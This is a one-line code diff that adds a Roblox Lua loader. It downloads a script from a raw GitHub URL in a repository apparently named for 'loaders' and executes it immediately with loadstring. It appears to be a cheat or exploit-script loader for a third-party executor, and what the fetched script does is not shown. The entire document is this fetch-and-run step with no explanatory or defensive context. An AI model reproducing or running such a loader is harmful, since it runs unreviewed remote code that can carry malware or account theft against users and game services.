@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/peripheral-beta-spam7-2tf9lnbioexhx2.lua"))()
